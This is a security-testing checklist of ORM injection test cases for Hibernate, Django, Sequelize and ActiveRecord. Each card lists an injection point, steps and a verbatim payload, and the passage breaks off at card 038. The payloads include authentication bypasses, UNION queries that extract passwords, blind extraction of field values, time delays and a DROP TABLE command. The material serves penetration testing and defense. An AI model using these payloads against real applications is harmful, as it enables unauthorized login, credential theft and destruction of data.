# ORM Injection — Checklist

Expert per-attack **test-case matrix** for ORM Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*231 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ORM-001 — ORM Fingerprinting via Error Provocation
**Test Category:** Reconnaissance · **Severity:** Info · **CVSS:** 0.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

**Where to Test / Injection Point:** Search/filter input fields

**Test Steps:** Inject special characters (' " ; \ ) into all input fields and observe error responses

**Expected Result:** Application returns ORM-specific error messages (e.g. Hibernate QueryException / Django FieldError / Sequelize DatabaseError)

**Payload Example:**

```
' OR "a"="a
```

**Impact:** ORM fingerprinting: identify framework/engine from errors &amp; behaviour

**Tools:** Burp Suite, curl, browser DevTools

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-002 — Identify ORM Framework from Stack Traces
**Test Category:** Reconnaissance · **Severity:** Info · **CVSS:** 0.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

**Where to Test / Injection Point:** HTTP response headers and error pages

**Test Steps:** Trigger errors and inspect stack traces / headers / cookie names for ORM fingerprints

**Expected Result:** Identify framework: e.g. JSESSIONID=Hibernate, csrfmiddlewaretoken=Django, laravel_session=Eloquent

**Payload Example:**

```
N/A
```

**Impact:** ORM fingerprinting: identify framework/engine from errors &amp; behaviour

**Tools:** Wappalyzer, WhatWeb, Burp Suite

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-003 — Detect Query Parameter Reflection in Errors
**Test Category:** Reconnaissance · **Severity:** Info · **CVSS:** 0.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

**Where to Test / Injection Point:** All query parameters

**Test Steps:** Submit malformed values in each parameter and check if the parameter name or value is reflected in error messages referencing ORM classes

**Expected Result:** Error messages disclose ORM model names / field names / query structure

**Payload Example:**

```
fieldName=INVALID_TYPE_999
```

**Impact:** ORM fingerprinting: identify framework/engine from errors &amp; behaviour

**Tools:** Burp Suite, ffuf

**References:** CWE-200; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-004 — HQL Injection - Auth Bypass (Hibernate)
**Test Category:** HQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login forms / auth endpoints

**Test Steps:** In username/password fields inject HQL boolean logic to bypass authentication

**Expected Result:** Login succeeds without valid credentials

**Payload Example:**

```
username=' OR 1=1 OR '&password=anything
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, sqlmap (--technique=B)

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-005 — HQL Injection - String Concatenation in search
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Inject HQL syntax into search parameter that is concatenated into createQuery()

**Expected Result:** Search returns all records or different result set

**Payload Example:**

```
' OR ''='
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, custom scripts

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-006 — HQL Injection - Boolean-Based Blind
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Send true-condition and false-condition payloads and compare response lengths/content

**Expected Result:** Response differs between true and false conditions

**Payload Example:**

```
' AND 1=1 AND 'a'='a vs ' AND 1=2 AND 'a'='a
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite Intruder, sqlmap

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-007 — HQL Injection - Time-Based Blind
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Inject time delay functions via HQL subquery calling native DB function

**Expected Result:** Response is delayed by specified seconds

**Payload Example:**

```
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, sqlmap --technique=T

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-008 — HQL Injection - Error-Based Extraction
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Inject HQL that forces a type conversion error leaking data in error messages

**Expected Result:** Database values appear in error messages

**Payload Example:**

```
' AND 1=CAST((SELECT version()) AS int) AND '1'='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, sqlmap

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-009 — HQL Injection - UNION-Based (if supported)
**Test Category:** HQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Search/filter fields

**Test Steps:** Attempt UNION with HQL entity references to extract data from other mapped entities

**Expected Result:** Data from other entities/tables returned

**Payload Example:**

```
' UNION SELECT u.username,u.password FROM User u WHERE '1'='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, manual testing

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-010 — HQL Injection - Subquery Data Exfiltration
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Inject HQL subquery to extract data from other entities

**Expected Result:** Subquery result influences response

**Payload Example:**

```
' AND (SELECT COUNT(*) FROM User)>0 AND '1'='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, sqlmap

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-011 — HQL Injection - Comment Injection
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any input mapped to HQL

**Test Steps:** Inject HQL comment syntax to truncate query

**Expected Result:** Query logic after injection point is ignored

**Payload Example:**

```
admin'--
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-012 — HQL Injection - ORDER BY Injection
**Test Category:** HQL Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sort/order parameters

**Test Steps:** Inject into ORDER BY clause if user controls sort parameter

**Expected Result:** Different sorting or error reveals injection

**Payload Example:**

```
sort=name,(SELECT 1)
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, custom scripts

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-013 — HQL Injection - Parameterized Bypass Check
**Test Category:** HQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login / search forms

**Test Steps:** Verify if application uses setParameter() by injecting typical bypass payloads

**Expected Result:** If parameterized: injection fails. If concatenated: injection succeeds.

**Payload Example:**

```
' OR '1'='1' --
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, code review (if whitebox)

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-014 — HQL Injection - Entity Name Enumeration
**Test Category:** HQL Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Search fields

**Test Steps:** Inject FROM clauses with guessed entity names to enumerate mapped entities

**Expected Result:** Error messages confirm/deny entity existence

**Payload Example:**

```
' UNION SELECT 1 FROM Admin a WHERE '1'='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Intruder with entity wordlist

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-015 — HQL Injection - Second-Order Injection
**Test Category:** HQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any Hibernate endpoint

**Test Steps:** Store payload in one request (e.g. profile name) that gets used in HQL query later

**Expected Result:** Payload executes when stored value is used in a query

**Payload Example:**

```
Register username: admin' OR '1'='1
```

**Impact:** HQL/Hibernate injection: authN bypass, full DB read/modify, potential RCE

**Tools:** Burp Suite, manual chaining

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-016 — Django ORM - extra() SQL Injection
**Test Category:** Django ORM Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Django search/filter parameters

**Test Steps:** Inject SQL into parameters passed to QuerySet.extra(where=[...]) or extra(select={...})

**Expected Result:** SQL executes within the extra clause; data leaks or auth bypass

**Payload Example:**

```
q=1) OR 1=1--
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-017 — Django ORM - raw() SQL Injection
**Test Category:** Django ORM Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Django search/filter parameters

**Test Steps:** Inject SQL into parameters concatenated into Manager.raw() or cursor.execute()

**Expected Result:** Full SQL injection achieved

**Payload Example:**

```
q=' UNION SELECT username,password FROM auth_user--
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-018 — Django ORM - Regex Lookup Injection (__regex)
**Test Category:** Django ORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django filter parameters

**Test Steps:** If filter uses __regex lookup with user input, inject regex to extract data boolean-style

**Expected Result:** Different responses for matching vs non-matching regex

**Payload Example:**

```
username__regex=^a (iterate chars to extract values)
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Intruder, custom Python script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-019 — Django ORM - Startswith/Contains Blind Extraction
**Test Category:** Django ORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django filter parameters

**Test Steps:** Use __startswith / __contains lookups to extract field values character by character

**Expected Result:** Response differs when prefix matches

**Payload Example:**

```
username__startswith=adm
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Intruder, custom script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-020 — Django ORM - JSON Field Traversal
**Test Category:** Django ORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django JSON fields

**Test Steps:** Inject into JSONField lookups to access nested keys or extract data

**Expected Result:** Unexpected JSON data accessed or error messages reveal structure

**Payload Example:**

```
data__key=value' OR '1'='1
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-021 — Django ORM - Lookup Type Injection
**Test Category:** Django ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django filter parameters

**Test Steps:** Manipulate the lookup type by injecting __gt / __lt / __in / __isnull into parameter names

**Expected Result:** Query logic changes (e.g. password__gt= returns records where password &gt; empty string)

**Payload Example:**

```
password__gt=&username=admin
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite, manual testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-022 — Django ORM - RawSQL in annotate() Injection
**Test Category:** Django ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django annotate/aggregate

**Test Steps:** Inject SQL into parameters used inside RawSQL() within annotate()

**Expected Result:** SQL injection via annotation

**Payload Example:**

```
val=1); SELECT pg_sleep(5)--
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-023 — Django ORM - Q Object Manipulation
**Test Category:** Django ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django filter expressions

**Test Steps:** If Q objects are built dynamically from user input, inject unexpected field lookups

**Expected Result:** Unauthorized data filtering / access

**Payload Example:**

```
filter=is_superuser&value=true
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-024 — Django ORM - values()/values_list() Field Injection
**Test Category:** Django ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django API endpoints

**Test Steps:** If field names in values() come from user input, inject sensitive field names

**Expected Result:** Sensitive fields (password hash, tokens) included in response

**Payload Example:**

```
fields=id,username,password
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite, Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-025 — Django ORM - GIS Field Injection
**Test Category:** Django ORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django GIS fields

**Test Steps:** Inject into GIS-specific lookups (contains, intersects, distance) if using GeoDjango

**Expected Result:** Unexpected spatial query behavior or SQL injection

**Payload Example:**

```
location__distance_lte=(POINT(0 0),999999) OR 1=1
```

**Impact:** Django ORM injection: QuerySet manipulation, data disclosure/bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-026 — Sequelize - Operator Injection ($ne auth bypass)
**Test Category:** Sequelize Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sequelize API filter params

**Test Steps:** Send JSON with MongoDB-style operators in query parameters to manipulate WHERE clause

**Expected Result:** Auth bypass: login without correct password

**Payload Example:**

```
POST {"username":"admin","password":{"$ne":""}}
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite, curl

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-027 — Sequelize - $gt Operator Injection
**Test Category:** Sequelize Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize API filter params

**Test Steps:** Inject $gt operator to change comparison logic

**Expected Result:** Query returns records where field &gt; specified value (bypasses exact match)

**Payload Example:**

```
GET /users?age[$gt]=0
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-028 — Sequelize - $regex/$like Operator Injection
**Test Category:** Sequelize Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize API filter params

**Test Steps:** Inject $like or $regexp operator for blind data extraction

**Expected Result:** Blind extraction of field values via pattern matching

**Payload Example:**

```
GET /users?password[$like]=a%25 (iterate)
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Intruder, custom script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-029 — Sequelize - $between Operator Injection
**Test Category:** Sequelize Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sequelize API filter params

**Test Steps:** Inject $between operator to extract numeric/date ranges

**Expected Result:** Returns records in injected range

**Payload Example:**

```
GET /users?id[$between][0]=1&id[$between][1]=9999
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-030 — Sequelize - $in Operator Injection
**Test Category:** Sequelize Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sequelize API filter params

**Test Steps:** Inject $in operator with array of values

**Expected Result:** Bypasses single-value checks

**Payload Example:**

```
GET /users?role[$in][0]=admin&role[$in][1]=user
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-031 — Sequelize - sequelize.query() Injection
**Test Category:** Sequelize Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sequelize raw query endpoints

**Test Steps:** Inject SQL into parameters used in sequelize.query() with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q='; DROP TABLE users;--
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** sqlmap, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-032 — Sequelize - Order Clause Injection via sequelize.literal()
**Test Category:** Sequelize Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize sort parameters

**Test Steps:** Inject into order parameter if it uses sequelize.literal()

**Expected Result:** Arbitrary SQL in ORDER BY

**Payload Example:**

```
sort=name; SELECT pg_sleep(5)
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-033 — Sequelize - Nested Object Injection
**Test Category:** Sequelize Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize filter params

**Test Steps:** Send deeply nested JSON objects to confuse Sequelize query builder

**Expected Result:** Unexpected query behavior or error

**Payload Example:**

```
POST {"where":{"$or":[{"role":"admin"}]}}
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-034 — Sequelize - Op.col Injection (Column Reference)
**Test Category:** Sequelize Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize endpoints

**Test Steps:** If Op.col is built from user input, inject column references to compare columns

**Expected Result:** password=Op.col('username') compares columns instead of values

**Payload Example:**

```
field=password&op=col&val=username
```

**Impact:** Sequelize injection: operator/where injection, DB read &amp; authN bypass

**Tools:** Manual testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-035 — ActiveRecord - where() String Injection
**Test Category:** ActiveRecord Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ActiveRecord search/filter

**Test Steps:** Inject SQL into where() calls that use string interpolation instead of parameterized hashes

**Expected Result:** SQL injection in WHERE clause

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-036 — ActiveRecord - order() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord sort parameter

**Test Steps:** Inject SQL into user-controlled order parameter

**Expected Result:** Arbitrary SQL execution via ORDER BY

**Payload Example:**

```
sort=name; SELECT pg_sleep(5)--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-037 — ActiveRecord - select() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord select parameter

**Test Steps:** Inject SQL into select() if field names come from user input

**Expected Result:** Extra columns / subquery data extracted

**Payload Example:**

```
fields=*,password FROM users--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-038 — ActiveRecord - group() Injection
